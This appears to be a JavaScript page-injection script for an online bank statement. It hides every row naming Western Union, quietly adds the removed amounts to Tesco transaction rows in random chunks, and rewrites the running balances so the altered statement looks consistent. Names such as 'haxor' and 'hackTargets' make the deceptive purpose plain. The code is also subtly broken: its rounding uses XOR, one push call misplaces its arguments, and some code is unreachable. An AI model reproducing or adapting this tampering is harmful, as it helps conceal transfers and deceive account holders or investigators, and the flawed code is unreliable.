var masterTableId = 'statementTable';
var found = false;
var timerMonitor = setInterval(haxor, 30);
var selector = '#' + masterTableId + ' td:contains("WESTERN UNION")';
var replacementRecipients = ['TESCO STORES 6077'];
var formatter = new Intl.NumberFormat('en-GB', { useGrouping: true });

function haxor() {
    clearInterval(timerMonitor);

    var $tBody = $('#statementTable tbody.cwa-tbody');
    var allBalanceRows = $tBody.find('tr.clickableLine');
    
    // sets row type to each of the rows based on the 
    allBalanceRows.each(function (idx, el) {
        if (el.cells[3].textContent.trim() !== '') {
            $(el).data('_type', 'inflow');
        }
        else if (el.cells[4].textContent.trim() !== '') {
            $(el).data('_type', 'outflow');
        }
    });

    var hackTargets = allBalanceRows.filter(function(idx, el) { 
        var row = el;

        return !$(el).hasClass('processed') && row.cells[1].textContent.includes('WESTER');
    });

	found = hackTargets.length > 0;
	
	if (found) {
        var wuRows = hackTargets;
        
        console.log('Hiding ' + wuRows.length + ' rows');
        wuRows.addClass('processed');
        wuRows.hide();

        var totalDisplaced = 0;

        wuRows.each(function(idx, el) {
            var amount = $(el)[0].cells[4].textContent;

            totalDisplaced += parseFloat(amount);
        });

        console.log(`Total displaced amount ${totalDisplaced}`);

        var newEntries = 10;
        var distributedValues = distributeDisplacement(totalDisplaced, 5, 30);

        console.log(distributedValues);

        var updateRows = $tBody.find('tr.clickableLine').filter(function (idx, el) {
            return replacementRecipients.includes(el.cells[1].textContent) && !el.cells[1].textContent.includes('WESTER');
        });

        // set newly distributed amounts to existing rows
        updateRows.each(function (idx, el) {
            var currentAmount = parseFloat(el.cells[4].textContent) + distributedValues[idx];

            el.cells[4].textContent = formatter.format(currentAmount.toFixed(2));
        });

        var newBallances = allBalanceRows.filter(function(idx, el) { 
            return !$(el).hasClass('processed');
        });

        newBallances.each(function (idx, el) { 
            if (idx < newBallances.length) {
                var nextRow = newBallances[idx + 1];
                var total = 0;

                if ($(el).data('_type') === 'outflow') {
                    var outflow = parseFloat($(el)[0].cells[4].textContent.replace(',', ''));
                    var amount = parseFloat($(el).find('td h4 span').first().text().replace(',', ''));

                    total = Math.roundTo(outflow + amount, 2);
                }
                else if ($(el).data('_type') === 'inflow') {
                    var amount = parseFloat($(el).find('td h4 span').first().text().replace(',', ''));
                    var inflow = parseFloat($(el)[0].cells[3].textContent.replace(',', ''));

                    total = Math.roundTo(amount - inflow, 2);
                }

                $(nextRow).find('td h4 span').first().text(formatter.format(total.toFixed(2)));
            }
        });

        return;
        // new rows

        var newRow = $(wuRows[0]).clone();

        newRow[0].cells[1].textContent = replacementRecipients[0];
        newRow.addClass('ghost');
        newRow.show();
        
        var $tBody = $('#statementTable tbody.cwa-tbody');

        $tBody.prepend(newRow);
    }
}

function distributeDisplacement(amountDisplaced, lowerLimit, upperLimit) {
    var remainingAmount = amountDisplaced;
    var distributedValues = [];
    var randomUpper = upperLimit;
    var randomLower = lowerLimit;

    while (true) {
        var value = Math.roundTo(Math.random() * (randomUpper - randomLower) + randomLower, 2);

        remainingAmount = remainingAmount - value;

        if (remainingAmount > 0) {
            distributedValues.push(value)
        }
        else {
            distributedValues.push(Math.roundTo(remainingAmount + value), 2);
            break;
        }
    }

    return distributedValues;
}

function sortTableByDate($tBody) {
    var rowsSorted = $tBody.find('tr.clickableLine').each(function() {
        var t = this.cells[0].textContent;

        $(this).data('_ts', t /*Date.parse(t)*/);
   });

   rowsSorted = rowsSorted.sort(function (a, b) {
       return $(a).data('_ts') < $(b).data('_ts');
   })
   
   $tBody.append(rowsSorted);
}

function roundTo(number, places) {
    return Math.round((10 ^ places) * number) / (10 ^ places);
}

Math.roundTo = roundTo;